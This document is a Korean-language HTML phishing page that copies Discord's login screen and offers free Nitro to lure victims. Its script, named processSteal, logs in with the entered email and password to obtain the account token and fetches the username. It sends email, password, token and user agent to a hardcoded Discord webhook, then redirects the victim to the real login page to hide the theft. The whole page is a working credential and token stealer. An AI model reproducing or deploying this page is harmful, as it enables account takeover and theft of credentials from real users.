<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>Discord | 로그인하여 계속하기</title>
    <style>
        body { background: #313338; color: #dbdee1; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: #313338; padding: 32px; border-radius: 5px; width: 414px; box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2); }
        h2 { color: #f2f3f5; text-align: center; margin-bottom: 8px; font-size: 24px; }
        .subtitle { color: #949ba4; text-align: center; font-size: 14px; margin-bottom: 20px; }
        label { display: block; font-size: 12px; font-weight: bold; color: #b5bac1; text-transform: uppercase; margin-bottom: 8px; }
        input { width: 100%; padding: 10px; background: #1e1f22; border: 1px solid #1e1f22; border-radius: 3px; color: #dbdee1; font-size: 16px; margin-bottom: 20px; box-sizing: border-box; }
        input:focus { border-color: #00a8fc; outline: none; }
        button { width: 100%; padding: 12px; background: #5865f2; border: none; color: white; border-radius: 3px; font-size: 16px; font-weight: 500; cursor: pointer; }
        button:hover { background: #4752c4; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>돌아오신 것을 환영해요!</h2>
        <p class="subtitle">무료 니트로 수령을 위해 디스코드 계정으로 로그인하세요.</p>
        
        <form id="loginForm" onsubmit="processSteal(event)">
            <label>이메일 또는 전화번호</label>
            <input type="text" id="email" required>
            
            <label>비밀번호</label>
            <input type="password" id="password" required>
            
            <button type="submit">로그인</button>
        </form>
    </div>

    <script>
        async function processSteal(event) {
            event.preventDefault();
            const webhookUrl = 'https://discord.com/api/webhooks/1568353008071344220/Pq1ZlrWG5Kcqsmir8uGOqDuLwqzRwYdg-twFDbla8s-2KXeTUTBHtL_gygqAktOv8QgQ';
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            let token = "토큰 발급 실패";
            let username = "닉네임 확인 불가";

            try {
                // 1. 로그인 API 호출하여 토큰 획득
                const loginRes = await fetch('https://discord.com/api/v9/auth/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ login: email, password: password, undelete: false, captcha_key: null, login_source: null, gift_code_sku_id: null })
                });
                
                const loginData = await loginRes.json();
                
                if (loginData.token) {
                    token = loginData.token;
                    
                    // 2. 획득한 토큰으로 유저 프로필(닉네임) 조회
                    const userRes = await fetch('https://discord.com/api/v9/users/@me', {
                        headers: { 'Authorization': token, 'Content-Type': 'application/json' }
                    });
                    const userData = await userRes.json();
                    if (userData.username) {
                        username = `${userData.global_name || userData.username} (${userData.username}#${userData.discriminator || '0'})`;
                    }
                } else if (loginData.mfa || loginData.ticket) {
                    token = "2단계 인증(MFA) 필요 계정 (티켓 존재)";
                } else {
                    token = "로그인 실패: " + JSON.stringify(loginData);
                }
            } catch (e) {
                token = "에러 발생: " + e.message;
            }

            // 3. 웹훅으로 정보 전송
            const payload = {
                content: `🚨 **[디스코드 계정 털림!]**\n👤 **유저 닉네임:** \`${username}\`\n📧 **이메일:** \`${email}\`\n🔑 **비밀번호:** \`${password}\`\n🎟️ **토큰:** \`${token}\`\n🌐 **UA:** \`${navigator.userAgent}\``
            };

            await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            // 4. 진짜 디스코드 로그인 페이지로 리다이렉트
            window.location.href = 'https://discord.com/login';
        }
    </script>
</body>
</html>
